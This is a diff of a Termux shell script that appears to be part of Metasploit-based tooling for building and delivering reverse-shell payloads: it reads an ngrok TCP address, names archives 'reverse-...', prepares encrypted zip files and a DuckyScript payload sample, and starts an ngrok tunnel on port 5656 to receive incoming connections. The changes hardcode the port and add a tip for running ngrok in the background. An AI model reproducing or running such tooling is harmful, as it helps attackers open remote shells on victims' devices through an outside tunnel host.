@@ -1,15 +1,15 @@
 #!/bin/sh
-TEMPFILE=/data/data/com.termux/files/home/msf/temp/.temp_ip_ngrok-tcp.txt
-touch $TEMPFILE
+TEMPFILE=/data/data/com.termux/files/home/msf/tmp/.temp_ip_ngrok-tcp.txt
 FILE=reverse$RANDOM-$(cat $TEMPFILE |sed "s#:#-port#g")
-PORT=$(cat $TEMPFILE |  cut -d ':' -f2)
+#PORT=$(cat $TEMPFILE |  cut -d ':' -f2)
+PORT=5656
 IP=$(cat $TEMPFILE | sed 's/\:.*//')
 RANDOMLETTER=$(cat /dev/urandom | tr -cd 'a-f0-9' | head -c 5)
-LINKFILE=/data/data/com.termux/files/home/msf/temp/link-$FILE.txt
-LINK7ZIP=/data/data/com.termux/files/home/msf/temp/link-$RANDOM-7zip.txt
-ARCHIVE="/data/data/com.termux/files/home/msf/temp/reverse-$RANDOMLETTER.zip"
-TEMP="/data/data/com.termux/files/home/msf/temp"
-ENCRYPTEDFILE="/data/data/com.termux/files/home/msf/temp/$FILE-encrypted.zip"
+LINKFILE=/data/data/com.termux/files/home/msf/tmp/link-$FILE.txt
+LINK7ZIP=/data/data/com.termux/files/home/msf/tmp/link-$RANDOM-7zip.txt
+ARCHIVE="/data/data/com.termux/files/home/msf/tmp/reverse-$RANDOMLETTER.zip"
+TEMP="/data/data/com.termux/files/home/msf/tmp"
+ENCRYPTEDFILE="/data/data/com.termux/files/home/msf/tmp/$FILE-encrypted.zip"
 DDFILE="/data/data/com.termux/files/home/msf/dd/payload_sample.dd"
 DDFILEENCRYPTED="/data/data/com.termux/files/home/msf/dd/payload_sample_encrypted.dd"
 OLDLINK=$(cat ~/msf/tmp/old_link.txt)
@@ -39,7 +39,7 @@ echo "\033[1;32m____    ____  ___       __  ___      ___      .__   __.  _______
     |__|      \______/   \______/  |_______|_______/                   
                                                                        
 \033[0m"
-echo "\033[1;34m \nIf have already have a ngrok server running to you want to kill it or not?\033[0m"
+echo "\033[1;34m \nIf have already have a ngrok server running to you want to kill it or not?\n(Tips: you should run ngrok on yourself before running this script, to put it in the background do >ngrok tcp 5656 > /dev/null &<\033[0m"
 echo "\033[1;34m \nType \033[1;32m y \033[0m\033[1;34m for yes, \033[1;32m n \033[0m\033[1;34m for no, then press ENTER\033[0m"
 read ngrok_choice
 if [ $ngrok_choice = "y" ]; then
@@ -49,7 +49,7 @@ if [ $ngrok_choice = "y" ]; then
 	pkill ngrok
 	pkill ngrok
 	echo "NGROK RANDOM SERVER TCP IS STARTING..."
-	ngrok tcp 5656 > /dev/null &
+	ngrok tcp $PORT > /dev/null &
 fi
 #Waiting for ngrok
 {
